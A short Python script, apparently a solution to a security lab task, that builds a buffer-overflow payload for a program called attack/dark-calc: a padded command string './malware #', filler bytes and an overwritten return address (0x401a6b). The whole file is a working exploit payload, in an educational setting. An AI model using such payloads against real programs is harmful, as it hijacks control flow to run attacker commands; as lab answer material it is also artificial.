#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
command = b"./malware #"

payload = command.ljust(16, b" ")
payload += b"B" * 8
payload += (0x401a6b).to_bytes(8, "little")

sys.stdout.buffer.write(payload + b"\n")
